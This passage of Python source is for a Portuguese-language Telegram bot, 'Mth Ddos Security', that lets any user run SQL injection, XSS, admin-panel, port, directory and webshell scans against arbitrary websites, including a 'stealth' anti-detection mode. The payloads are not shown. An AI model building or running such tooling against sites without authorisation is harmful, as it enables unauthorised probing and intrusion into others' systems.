/sub &lt;domain&gt; — Subdomínios (100+ subs + permutações)
/wp &lt;url&gt; — WordPress Scanner + CVE check
/ftpssh &lt;ip&gt; — FTP/SSH banner

<b>🛡️ Scanners V5.0:</b>
/ssl &lt;url&gt; — Auditoria SSL/TLS + OCSP + chain
/headers &lt;url&gt; — Security Headers + suggestions
/cors &lt;url&gt; — CORS misconfiguration
/robots &lt;url&gt; — Robots.txt + diretórios escondidos
/sitemap &lt;url&gt; — Sitemap.xml + URLs expostas
/tech &lt;url&gt; — Tecnologias (frameworks, CDNs, analytics)
/exposed &lt;url&gt; — Arquivos sensíveis (.env, .git, etc.)
/backup &lt;url&gt; — Backups expostos (.sql, .zip, etc.)
/api &lt;url&gt; — Endpoints de API (/api/v1, /graphql, etc.)
/shell &lt;url&gt; — Webshells (c99, r57, c100, etc.)
/config &lt;url&gt; — Configs expostas (config.php, settings.json)

<b>⚡ Comandos Rápidos V5.1:</b>
/quick &lt;url&gt; — Scan rápido (info + headers)
/scanall &lt;url&gt; — Scan completo (6 ferramentas)
/deep &lt;url&gt; — Deep scan vulns (6 scanners)
/http &lt;url&gt; — Análise HTTP response completa
/sslchain &lt;url&gt; — Cadeia de certificados SSL
/batch &lt;cmd&gt; &lt;urls...&gt; — Scan múltiplos targets
/watch &lt;url&gt; [min] — Monitorar mudanças de conteúdo
/cancel — Cancelar scan ativo
/report &lt;url&gt; — Relatório completo em TXT

<b>🔍 Ferramentas Extras:</b>
/traceroute &lt;ip&gt; — Rastreamento de rota
/whois &lt;domain&gt; — Informações do domínio
/ip &lt;ip&gt; — GeoIP avançado (ISP, ASN, proxy)
/rate &lt;url&gt; — Nota de segurança geral (0-100)
/compare &lt;url1&gt; &lt;url2&gt; — Comparar segurança de 2 sites
/history &lt;url&gt; — Histórico de scans
/pdf &lt;comando&gt; &lt;url&gt; — Exportar relatório TXT
/schedule &lt;min&gt; &lt;comando&gt; &lt;url&gt; — Agendar scan
/stealth &lt;comando&gt; &lt;url&gt; — Scan lento (anti-detect)
/notify &lt;url&gt; — Notificar quando mudar status

<b>📋 Sistema:</b>
/ping — Latência do bot
/status — Health check
/about — Sobre o bot
/feedback &lt;msg&gt; — Enviar sugestão
/bugreport &lt;msg&gt; — Reportar bug
/rescan &lt;comando&gt; &lt;url&gt; — Refazer scan
/stop [id] — Parar scan

<b>━━━━━━━━━━━━━━━━━━━━━━</b>
<b>👑 Donos:</b> @OnlyExaltarei, @Thebesty9, @PETER_DNS
━━━━━━━━━━━━━━━━━━━━━━

<b>👑 Comandos exclusivos dos Donos:</b>
/botpanel — Painel do bot
/logs — Histórico de comandos
/bancodds — Dump do banco
/msg &lt;texto&gt; — Broadcast pra todos
/stats — Estatísticas
/ban &lt;id&gt; [motivo] — Banir usuário
/unban &lt;id&gt; — Desbanir
/export — Exportar usuários
/listdn — Lista de dono
/maintenance [on/off] — Modo manutenção
/cooldown &lt;id&gt; &lt;limite&gt; — Rate limit
/vip add/remove &lt;id&gt; — Gerenciar VIPs
/log &lt;user_id&gt; — Audit logs
/clearlogs — Limpar logs
/broadcast &lt;min&gt; &lt;texto&gt; — Agendar broadcast
/top — Top sites escaneados

━━━━━━━━━━━━━━━━━━━━━━
<i>Mth Ddos Security v5.1</i>
<i>Uso apenas para fins educacionais e de segurança autorizada.</i>"""

    send_message_safe(chat_id, msg)

def handle_about(chat_id, user_id, username, first_name, last_name, args=None):
    log_user(user_id, username, first_name, last_name)
    msg = """🛡️ <b>Mth Ddos Security v5.1</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>Desenvolvedores:</b>
@OnlyExaltarei
@Thebesty9
@PETER_DNS

<b>Versão:</b> 5.1
<b>Plataforma:</b> Telegram Bot (Python)
<b>Ferramentas:</b> 46 ferramentas avançadas com anti-false-positive
<b>Banco:</b> SQLite com índices, otimizações e cache inteligente
<b>Segurança:</b> Sistema de donos + VIP + rate limit custom

<b>Novidades V5.1:</b>
• /quick — Scan rápido em 1 segundo
• /scanall — Scan completo (6 scanners)
• /deep — Deep scan de vulnerabilidades
• /http — Análise HTTP response detalhada
• /sslchain — Cadeia de certificados SSL
• /batch — Scan múltiplos targets
• /watch — Monitorar mudanças de conteúdo
• /cancel — Cancelar scan ativo
• /report — Relatório completo em TXT
• WAF Detection no SQLi e XSS
• Banner grabbing no port scanner
• 100+ subdomínios + permutações
• DNSSEC, DKIM, DMARC, Reverse PTR
• Cache inteligente (10 min TTL)
• Inline buttons para rescan
• 30+ CMS detection

<b>Recursos V5.0:</b>
• 30+ payloads SQLi com WAF detection
• 18+ payloads XSS com WAF detection
• 100+ paths para Painel Admin Finder
• 50+ portas com banner grabbing
• 80+ diretórios expostos
• Filtros anti-false-positive
• Connection pooling + thread pool
• 11 scanners V5.0 (SSL, Headers, CORS, etc.)
• DNS-over-HTTPS
• Traceroute + Whois + GeoIP
• Security rating (0-100)
• Scheduled scans + Stealth mode
• Maintenance mode + VIP system
• Audit logs + Queue system

<i>Uso apenas para fins educacionais e de segurança autorizada.</i>"""
    send_message_safe(chat_id, msg)

def handle_info(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /info &lt;url&gt;\nExemplo: /info example.com")
        return
    target = args[0]
    log_command(user_id, username, "info", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Analisando</b> {escape_html(clean_target)}...")
    result = tool_website_info(target)
    send_message_safe(chat_id, result)

def handle_sqli(chat_id, user_id, username, first_name, last_name, args):
    """SQLi Scanner with verbose mode, DB cache, and inline buttons"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /sqli &lt;url&gt; [verbose]\nExemplo: /sqli example.com/?id=1\nExemplo: /sqli example.com/?id=1 verbose")
        return
    target = args[0]
    verbose = len(args) > 1 and args[1].lower() == 'verbose'
    log_command(user_id, username, "sqli", target)
    clean_target = extract_hostname(target)

    # V4.3: Check DB cache first (unless verbose)
    if not verbose:
        cached = db_cache_get("sqli", target)
        if cached:
            buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:sqli:{target}"}]]
            send_message_with_buttons(chat_id, cached, buttons)
            return

    if verbose:
        send_message_safe(chat_id, f"🔍 <b>Scanner SQLi (VERBOSE)</b> em {escape_html(clean_target)}...\n📊 Modo detalhado ativado — mostrando cada payload testado.")
    else:
        send_message_safe(chat_id, f"🔍 <b>Scanner SQLi iniciado</b> em {escape_html(clean_target)}...")

    result = tool_sqli(target, verbose=verbose)

    # V4.3: Store in DB cache
    db_cache_set("sqli", target, result)

    # V4.3: Add inline button for rescan
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:sqli:{target}"}]]
    send_message_with_buttons(chat_id, result, buttons)


def handle_xss(chat_id, user_id, username, first_name, last_name, args):
    """XSS Scanner with verbose mode, DB cache, and inline buttons"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /xss &lt;url&gt; [verbose]\nExemplo: /xss example.com/?q=\nExemplo: /xss example.com/?q= verbose")
        return
    target = args[0]
    verbose = len(args) > 1 and args[1].lower() == 'verbose'
    log_command(user_id, username, "xss", target)
    clean_target = extract_hostname(target)

    # V4.3: Check DB cache first (unless verbose)
    if not verbose:
        cached = db_cache_get("xss", target)
        if cached:
            buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:xss:{target}"}]]
            send_message_with_buttons(chat_id, cached, buttons)
            return

    if verbose:
        send_message_safe(chat_id, f"🔍 <b>Scanner XSS (VERBOSE)</b> em {escape_html(clean_target)}...\n📊 Modo detalhado ativado — mostrando cada payload testado.")
    else:
        send_message_safe(chat_id, f"🔍 <b>Scanner XSS iniciado</b> em {escape_html(clean_target)}...")

    result = tool_xss_scanner(target, verbose=verbose)

    # V4.3: Store in DB cache
    db_cache_set("xss", target, result)

    # V4.3: Add inline button for rescan
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:xss:{target}"}]]
    send_message_with_buttons(chat_id, result, buttons)

def handle_admin_panel(chat_id, user_id, username, first_name, last_name, args):
    """/admin — Quick admin panel finder (progress + cache + buttons)"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /admin &lt;url&gt;\nExemplo: /admin example.com")
        return
    target = args[0]
    log_command(user_id, username, "admin_panel", target)
    clean_target = extract_hostname(target)

    # V5.1: Check DB cache first
    cached = db_cache_get("admin", target)
    if cached:
        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:admin:{target}"}]]
        send_message_with_buttons(chat_id, cached, buttons)
        return

    send_message_safe(chat_id, f"🔍 <b>Buscando painéis admin</b> em {escape_html(clean_target)}...")
    scan_id = f"admin_{user_id}_{time.time()}"
    progress_msg_id = send_progress(chat_id, scan_id, 0, 100, "Escaneando paths...")
    result = tool_admin_finder(target, chat_id, progress_msg_id)
    finish_progress(progress_msg_id, chat_id, result)
    db_cache_set("admin", target, result)
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:admin:{target}"}]]
    send_message_with_buttons(chat_id, result, buttons)

def handle_ports(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /ports &lt;ip/domain&gt;\nExemplo: /ports example.com")
        return
    target = args[0]
    log_command(user_id, username, "ports", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Scan de portas</b> em {escape_html(clean_target)}...")
    result = tool_port_scanner(target)
    send_message_safe(chat_id, result)

def handle_dirs(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /dirs &lt;url&gt;\nExemplo: /dirs example.com")
        return
    target = args[0]
    log_command(user_id, username, "dirs", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Scan de diretórios</b> em {escape_html(clean_target)}...")
    result = tool_directory_scanner(target)
    send_message_safe(chat_id, result)

def handle_sub(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /sub &lt;domain&gt;\nExemplo: /sub example.com")
        return
    target = args[0]
    log_command(user_id, username, "sub", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Scan de subdomínios</b> em {escape_html(clean_target)}...")
    result = tool_subdomain_scanner(target)
    send_message_safe(chat_id, result)

def handle_wp(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /wp &lt;url&gt;\nExemplo: /wp example.com")
        return
    target = args[0]
    log_command(user_id, username, "wp", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>WordPress Scanner</b> em {escape_html(clean_target)}...")
    result = tool_wordpress_scanner(target)
    send_message_safe(chat_id, result)

def handle_emails(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /emails &lt;url&gt;\nExemplo: /emails example.com")
        return
    target = args[0]
    log_command(user_id, username, "emails", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Extraindo emails</b> de {escape_html(clean_target)}...")
    result = tool_email_scraper(target)
    send_message_safe(chat_id, result)

def handle_dns(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /dns &lt;domain&gt;\nExemplo: /dns example.com")
        return
    target = args[0]
    log_command(user_id, username, "dns", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Análise DNS</b> de {escape_html(clean_target)}...")
    result = tool_dns_tools(target)
    send_message_safe(chat_id, result)

def handle_cms(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /cms &lt;url&gt;\nExemplo: /cms example.com")
        return
    target = args[0]
    log_command(user_id, username, "cms", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Detectando CMS</b> em {escape_html(clean_target)}...")
    result = tool_cms_detector(target)
    send_message_safe(chat_id, result)

def handle_reverse(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /reverse &lt;ip&gt;\nExemplo: /reverse 8.8.8.8")
        return
    target = args[0]
    log_command(user_id, username, "reverse", target)
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Reverse IP</b> de {escape_html(clean_target)}...")
    result = tool_reverse_ip(target)
    send_message_safe(chat_id, result)

def handle_ftpssh(chat_id, user_id, username, first_name, last_name, args):
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /ftpssh &lt;ip/domain&gt;\nExemplo: /ftpssh example.com")
        return
    target = args[0]
    log_command(user_id, username, "ftpssh", target)
    # FIX v3.9: Show clean hostname in progress message
    clean_target = extract_hostname(target)
    send_message_safe(chat_id, f"🔍 <b>Scan FTP/SSH</b> em {escape_html(clean_target)}...")
    result = tool_ftp_ssh(target)
    send_message_safe(chat_id, result)

def handle_ping(chat_id, user_id, username, first_name, last_name, args):
    """Ping command - show bot response time and status"""
    log_user(user_id, username, first_name, last_name)

    # FIX v3.7: Correctly separate bot latency from API latency
    bot_start = time.time()  # Start timer for total bot processing

    # API latency = time to reach Telegram servers
    api_start = time.time()
    resp = None
    api_latency = 0
    api_status = "Offline"
    try:
        resp = HTTP_SESSION.get(f"{API_URL}/getMe", timeout=5)
        api_latency = (time.time() - api_start) * 1000
        api_status = "Online" if resp and resp.status_code == 200 else "Error"
    except:
        api_latency = 0
        api_status = "Offline"

    # Bot latency = total time minus API time (the bot's own processing)
    total_time = (time.time() - bot_start) * 1000  # ms
    bot_latency = max(0, total_time - api_latency)  # Bot's own processing time
    uptime = time.time() - BOT_START_TIME
    days = int(uptime // 86400)
    hours = int((uptime % 86400) // 3600)
    minutes = int((uptime % 3600) // 60)
    secs = int(uptime % 60)

    # Check bot name
    try:
        bot_name = resp.json().get('result', {}).get('username', 'N/D') if resp and resp.status_code == 200 else 'N/D'
    except:
        bot_name = 'N/D'

    # Uptime string
    if days > 0:
        uptime_str = f"{days}d {hours}h {minutes}m {secs}s"
    elif hours > 0:
        uptime_str = f"{hours}h {minutes}m {secs}s"
    elif minutes > 0:
        uptime_str = f"{minutes}m {secs}s"
    else:
        uptime_str = f"{secs}s"

    # Connection speed indicator (based on API latency)
    if api_latency < 200:
        speed_icon = "⚡"
        speed_label = "Rápido"
    elif api_latency < 500:
        speed_icon = "🟢"
        speed_label = "Normal"
    elif api_latency < 1000:
        speed_icon = "🟡"
        speed_label = "Lento"
    else:
        speed_icon = "🔴"
        speed_label = "Muito lento"

    msg = f"""🏓 <b>Ping — MTH Security v5.1</b>
━━━━━━━━━━━━━━━━━━━━━━

📡 <b>Latência do Bot:</b> {bot_latency:.1f}ms
📡 <b>Latência da API Telegram:</b> {api_latency:.1f}ms
{speed_icon} <b>Status da Conexão:</b> {speed_label}

🤖 <b>Bot:</b> @{escape_html(bot_name)}
📊 <b>API Status:</b> {api_status}

⏱️ <b>Uptime:</b> {uptime_str}

👤 <b>Seu ID:</b> <code>{user_id}</code>
👤 <b>Username:</b> @{escape_html(username)}

━━━━━━━━━━━━━━━━━━━━━━
<i>Envio: {datetime.now().strftime('%H:%M:%S')}</i>"""

    send_message_safe(chat_id, msg)

# ═══════════════════════════════════════════════════════════════
#  OWNER-ONLY COMMANDS
# ═══════════════════════════════════════════════════════════════

def handle_logs(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Ver logs de usuários"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "logs")

    stats = get_user_stats()

    if args and len(args) > 0:
        arg = args[0]
        # Check for user: prefix
        if arg.startswith("user:"):
            uid_str = arg.split(":", 1)[1]
            if not uid_str.isdigit():
                send_message_safe(chat_id, "❌ Use: /logs user:&lt;id&gt;\nExemplo: /logs user:123456789")
                return
            user_logs = get_user_logs(int(uid_str))
            if not user_logs:
                send_message_safe(chat_id, f"📋 <b>Nenhum log encontrado para ID:</b> {uid_str}")
                return
            msg = f"📋 <b>Logs do Usuário ID: {uid_str}</b> ({len(user_logs)} comandos)\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for l in user_logs[:15]:
                msg += f"📌 /{l['command']} → {l['target'] or 'N/A'}\n"
                msg += f"   @{l['username']} | {l['timestamp']}\n\n"
            send_long_message(chat_id, msg)
            return

        # Check for plain number
        if arg.isdigit():
            user_logs = get_user_logs(int(arg))
            if not user_logs:
                send_message_safe(chat_id, f"📋 <b>Nenhum log encontrado para ID:</b> {arg}")
                return
            msg = f"📋 <b>Logs do Usuário ID: {arg}</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for l in user_logs[:10]:
                msg += f"📌 /{l['command']} → {l['target'] or 'N/A'}\n"
                msg += f"   Data: {l['timestamp']}\n\n"
            send_long_message(chat_id, msg)
            return

        # FIX v3.7: Username search with LIKE wildcard escaping + context manager
        try:
            with sqlite3.connect(DB_PATH) as conn:
                conn.row_factory = sqlite3.Row
                c = conn.cursor()
                escaped_arg = arg.replace('%', '\\%').replace('_', '\\_')
                c.execute("SELECT * FROM logs WHERE username LIKE ? ESCAPE '\\' ORDER BY id DESC LIMIT 15", (f"%{escaped_arg}%",))
                rows = [dict(r) for r in c.fetchall()]
        except Exception as e:
            rows = []
            print(f"[DB Error] logs username search: {e}")

        if rows:
            msg = f"📋 <b>Logs para @{escape_html(arg)}</b> ({len(rows)} comandos)\n━━━━━━━━━━━━━━━━━━━━━━\n"
            for l in rows:
                msg += f"📌 /{l['command']} → {l['target'] or 'N/A'}\n"
                msg += f"   ID:{l['user_id']} | {l['timestamp']}\n\n"
            send_long_message(chat_id, msg)
        else:
            send_message_safe(chat_id, f"📋 <b>Nenhum log encontrado para:</b> {arg}")
        return

    # Show global stats + recent logs
    logs = get_recent_logs(15)

    msg = f"📊 <b>Painel Administrativo — Logs</b>\n━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"👥 <b>Total Usuários:</b> {stats['total']}\n"
    msg += f"👑 <b>Donos:</b> {stats['owners']}\n"
    msg += f"👤 <b>Regulares:</b> {stats['regular']}\n"
    msg += f"⚡ <b>Total Comandos:</b> {stats['commands']}\n"
    msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📋 <b>Últimos 15 comandos:</b>\n\n"

    for l in logs:
        name = f"@{l['username']}" if l['username'] else str(l['user_id'])
        msg += f"📌 {name} → /{l['command']}\n"
        msg += f"   Target: {l['target'] or 'N/A'}\n"
        msg += f"   {l['timestamp']}\n\n"

    msg += "━━━━━━━━━━━━━━━━━━━━━━\n"
    msg += "<i>Use /logs &lt;id&gt; para ver logs de um usuário\n"
    msg += "Use /logs user:&lt;id&gt; para ver comandos de um ID específico\n"
    msg += "Use /logs &lt;username&gt; para buscar por nome</i>"

    send_long_message(chat_id, msg)

def handle_panel(chat_id, user_id, username, first_name, last_name, args):
    """PUBLIC: Painel Admin Finder — encontrar painéis de administração de sites"""
    log_user(user_id, username, first_name, last_name)
    if not args:
        send_message_safe(chat_id, "❌ Use: /panel &lt;url&gt;\nExemplo: /panel example.com")
        return
    target = args[0]
    log_command(user_id, username, "panel", target)
    clean_target = extract_hostname(target)

    # V5.1: Check DB cache first
    cached = db_cache_get("panel", target)
    if cached:
        buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:panel:{target}"}]]
        send_message_with_buttons(chat_id, cached, buttons)
        return

    send_message_safe(chat_id, f"🔍 <b>Painel Admin Finder</b> em {escape_html(clean_target)}...\n📊 Scan completo com 100+ paths...")
    scan_id = f"panel_{user_id}_{time.time()}"
    # V5.1: Set stop event for cancellation
    STOP_EVENTS[user_id] = threading.Event()
    progress_msg_id = send_progress(chat_id, scan_id, 0, 100, "Escaneando paths...")
    result = tool_admin_finder(target, chat_id, progress_msg_id)
    finish_progress(progress_msg_id, chat_id, result)
    db_cache_set("panel", target, result)
    # Cleanup stop event
    if user_id in STOP_EVENTS:
        del STOP_EVENTS[user_id]
    buttons = [[{"text": "🔄 Rescan", "callback_data": f"rescan:panel:{target}"}]]
    send_message_with_buttons(chat_id, result, buttons)

def handle_botpanel(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Painel admin do bot (stats, donos, comandos)"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "botpanel")
    stats = get_user_stats()

    uptime = time.time() - BOT_START_TIME
    days = int(uptime // 86400)
    hours = int((uptime % 86400) // 3600)
    minutes = int((uptime % 3600) // 60)
    secs = int(uptime % 60)

    if days > 0:
        uptime_str = f"{days}d {hours}h {minutes}m {secs}s"
    elif hours > 0:
        uptime_str = f"{hours}h {minutes}m {secs}s"
    else:
        uptime_str = f"{minutes}m {secs}s"

    # Get DB size
    try:
        db_size = os.path.getsize(DB_PATH) / 1024
        db_size_str = f"{db_size:.1f} KB"
    except:
        db_size_str = "N/D"

    msg = f"""📊 <b>Painel do Bot — MTH Security v5.1</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>📈 Estatísticas:</b>
👥 Total de usuários: {stats['total']}
👑 Donos: {stats['owners']}
👤 Regulares: {stats['regular']}
⚡ Total de comandos: {stats['commands']}
⏱️ Uptime: {uptime_str}
💾 Banco: {db_size_str}

<b>👑 Donos/Desenvolvedores:</b>"""

    for uid, uname in OWNERS.items():
        msg += f"\n  → {uname} (ID: {uid})"

    msg += """

<b>📋 Comandos Restritos (Donos):</b>
/logs — Ver histórico de comandos
/botpanel — Este painel
/bancodds — Dump do banco de dados
/msg — Enviar mensagem pra todos os usuários
/stats — Estatísticas de usuários
/ban — Banir usuário
/unban — Desbanir usuário
/export — Exportar lista de usuários
/maintenance — Modo manutenção
/cooldown — Configurar rate limit
/vip add/remove — Gerenciar VIPs
/log — Audit logs detalhados
/clearlogs — Limpar logs antigos
/broadcast — Agendar broadcast
/top — Top sites mais escaneados

<b>🔧 Ferramentas (Todos):</b>
/info, /sqli, /xss, /admin, /panel,
/ports, /dirs, /sub, /wp, /emails,
/dns, /cms, /reverse, /ftpssh, /ping, /uptime

<b>🛡️ Scanners V5.0:</b>
/ssl — Auditoria SSL/TLS
/headers — Análise de Security Headers
/cors — Teste CORS misconfiguration
/robots — Análise robots.txt
/sitemap — Análise sitemap.xml
/tech — Detecção de tecnologias
/exposed — Arquivos sensíveis expostos
/backup — Backups expostos
/api — Descoberta de APIs
/shell — Hunt de webshells
/config — Configs expostas
/traceroute — Rastreamento de rota
/whois — Informações do domínio
/ip — GeoIP avançado
/rate — Nota de segurança geral
/compare — Comparar 2 sites
/history — Histórico de scans
/pdf — Exportar relatório
/schedule — Agendar scan
/stealth — Scan lento (anti-detect)
/notify — Notificar quando mudar

━━━━━━━━━━━━━━━━━━━━━━
<i>""" + datetime.now().strftime("%d/%m/%Y %H:%M") + """</i>"""

    send_message_safe(chat_id, msg)

def handle_bancodds(chat_id, user_id, username, first_name, last_name, args):
    """OWNER ONLY: Dump do banco de dados"""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "bancodds")
    send_message_safe(chat_id, "⏳ <b>Gerando dump do banco de dados...</b>")

    dump = get_db_dump()

    # If too long, send as document
    if len(dump) > 3500:
        success = send_document(chat_id, dump, "mth_security_database_dump.txt")
        if success:
            send_message_safe(chat_id, "📄 <b>Dump do banco enviado como arquivo.</b>")
        else:
            send_message_safe(chat_id, "❌ <b>Falha ao enviar o dump do banco.</b> Tente novamente.")
    else:
        # FIX v3.9: Escape HTML in inline dump to prevent XSS via username/target
        safe_dump = escape_html(dump)
        send_message_safe(chat_id, f"📊 <b>Banco de Dados</b>\n━━━━━━━━━━━━━━━━━━━━━━\n" + safe_dump)

# ═══════════════════════════════════════════════════════════════
#  GRACEFUL SHUTDOWN
# ═══════════════════════════════════════════════════════════════
def handle_msg(chat_id, user_id, username, first_name, last_name, args, reply_media=None):
    """OWNER ONLY: Broadcast message to ALL users in the database.
    Supports replying to a sticker/photo with /msg to send media + caption."""
    log_user(user_id, username, first_name, last_name)

    if not is_owner(user_id):
        send_message_safe(chat_id, "🚫 <b>Acesso negado!</b> Este comando é restrito aos donos do bot.")
        return

    log_owner_command(user_id, username, "msg")

    message_text = ' '.join(args) if args else ''

    # If no media reply and no text, show usage
    if not reply_media and not args:
        send_message_safe(chat_id, "❌ Use: /msg &lt;sua mensagem&gt;\nOu envie um sticker/imagem e responda com /msg &lt;sua mensagem&gt;")
        return

    # Get all users from database
    try:
        with sqlite3.connect(DB_PATH) as conn:
            conn.row_factory = sqlite3.Row
            c = conn.cursor()
            c.execute("SELECT id, username FROM users WHERE is_owner = 0")
            users = [dict(r) for r in c.fetchall()]
    except Exception as e:
        print(f"[DB Error] handle_msg: {e}")
        send_message_safe(chat_id, "❌ Erro ao buscar lista de usuários.")
        return

    if not users:
        send_message_safe(chat_id, "ℹ️ Nenhum usuário regular encontrado para enviar.")
        return

    if reply_media:
        # MEDIA BROADCAST: send sticker/photo + caption
        media_type = reply_media.get('type')
        file_id = reply_media.get('file_id')
        caption = f"📢 {message_text}" if message_text else ''

        if media_type == 'sticker':
            send_message_safe(chat_id, f"📢 <b>Enviando sticker para {len(users)} usuários...</b>")
            sent = 0
            failed = 0
            for u in users:
                try:
                    resp = HTTP_SESSION.post(f"{API_URL}/sendSticker", json={
                        "chat_id": str(u['id']),
                        "sticker": file_id
                    }, timeout=10)
                    if resp and resp.status_code == 200:
                        sent += 1
                        # Send caption as separate message after sticker
                        if caption:
                            time.sleep(0.1)
                            send_message_safe(str(u['id']), caption, parse_mode=None)
                    else:
                        failed += 1
                    time.sleep(0.3)
                except:
                    failed += 1
            send_message_safe(chat_id, f"✅ <b>Broadcast concluído!</b>\n📤 Enviado: {sent}/{len(users)}\n❌ Falhou: {failed}")

        elif media_type == 'photo':
            send_message_safe(chat_id, f"📢 <b>Enviando imagem para {len(users)} usuários...</b>")
            sent = 0
            failed = 0
            for u in users:
                try:
                    resp = HTTP_SESSION.post(f"{API_URL}/sendPhoto", json={
                        "chat_id": str(u['id']),
                        "photo": file_id,
                        "caption": caption or '📢 Mensagem dos Donos',
                        "parse_mode": "HTML"
                    }, timeout=10)
                    if resp and resp.status_code == 200:
                        sent += 1
                    else:
                        failed += 1
                    time.sleep(0.3)
                except:
                    failed += 1
            send_message_safe(chat_id, f"✅ <b>Broadcast concluído!</b>\n📤 Enviado: {sent}/{len(users)}\n❌ Falhou: {failed}")

        elif media_type == 'animation':
            send_message_safe(chat_id, f"📢 <b>Enviando GIF para {len(users)} usuários...</b>")
            sent = 0
            failed = 0
            for u in users:
                try:
                    resp = HTTP_SESSION.post(f"{API_URL}/sendAnimation", json={
                        "chat_id": str(u['id']),
                        "animation": file_id,
                        "caption": caption or '📢 Mensagem dos Donos',
                        "parse_mode": "HTML"
                    }, timeout=15)
                    if resp and resp.status_code == 200:
                        sent += 1
                    else:
                        failed += 1
                    time.sleep(0.3)
                except:
                    failed += 1
            send_message_safe(chat_id, f"✅ <b>Broadcast concluído!</b>\n📤 Enviado: {sent}/{len(users)}\n❌ Falhou: {failed}")

        elif media_type == 'video':
            send_message_safe(chat_id, f"📢 <b>Enviando vídeo para {len(users)} usuários...</b>")
            sent = 0
            failed = 0
            for u in users:
                try:
                    resp = HTTP_SESSION.post(f"{API_URL}/sendVideo", json={
                        "chat_id": str(u['id']),
                        "video": file_id,
                        "caption": caption or '📢 Mensagem dos Donos',
                        "parse_mode": "HTML"
                    }, timeout=20)
                    if resp and resp.status_code == 200:
                        sent += 1
                    else:
                        failed += 1
                    time.sleep(0.3)
                except:
                    failed += 1
            send_message_safe(chat_id, f"✅ <b>Broadcast concluído!</b>\n📤 Enviado: {sent}/{len(users)}\n❌ Falhou: {failed}")
        else:
            send_message_safe(chat_id, "❌ Tipo de mídia não suportado.")

    else:
        # TEXT BROADCAST (original behavior)
        send_message_safe(chat_id, f"📢 <b>Enviando mensagem para todos os usuários...</b>\nMensagem: {escape_html(message_text[:100])}")

        broadcast = f"""📢 <b>Mensagem dos Donos</b>
━━━━━━━━━━━━━━━━━━━━━━

{escape_html(message_text)}

━━━━━━━━━━━━━━━━━━━━━━
<i>— Mth Ddos Security Team</i>"""

        sent = 0
        failed = 0
        for u in users:
            try:
                resp = HTTP_SESSION.post(f"{API_URL}/sendMessage", json={
                    "chat_id": str(u['id']),
                    "text": broadcast,
                    "parse_mode": "HTML",
                    "disable_web_page_preview": True
                }, timeout=10)
                if resp and resp.status_code == 200:
                    sent += 1
                else:
                    failed += 1
                # Rate limit between sends to avoid 429
                time.sleep(0.3)
            except:
                failed += 1

        send_message_safe(chat_id, f"✅ <b>Broadcast concluído!</b>\n📤 Enviado: {sent}/{len(users)}\n❌ Falhou: {failed}")

# ═══════════════════════════════════════════════════════════════
#  NEW HANDLERS: /stats, /ban, /unban, /export, /uptime
# ═══════════════════════════════════════════════════════════════

